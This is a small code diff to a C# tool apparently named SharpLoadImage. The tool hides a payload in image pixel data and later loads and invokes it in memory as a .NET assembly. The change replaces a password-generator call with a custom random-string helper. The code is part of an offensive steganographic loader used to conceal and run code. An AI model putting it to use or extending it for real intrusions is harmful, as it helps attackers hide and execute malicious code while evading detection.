@@ -6,13 +6,12 @@
 using System;
 using System.Text;
 using System.Drawing;
-
 using NDesk.Options;
 using System.IO;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
-using System.Web.Security;
 using System.Reflection;
+using System.Linq;
 
 namespace SharpLoadImage
 {
@@ -86,8 +85,7 @@ namespace SharpLoadImage
                 }
 
                 //Generate a random string to use to fill other pixel info in the picture.
-                //(Calling get-random everytime is too slow)
-                string randstr = Membership.GeneratePassword(128, 0);
+                string randstr = RandomString(128);
                 byte[] randb = Encoding.ASCII.GetBytes(randstr);
 
                 //loop through the RGB array and copy the payload into it
@@ -156,6 +154,14 @@ namespace SharpLoadImage
 
             Assembly assembly = Assembly.Load(otrue);
             assembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[0]);
+        }
+
+        private static string RandomString(int length)
+        {
+            Random random = new Random();
+            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
         }
     }
 }
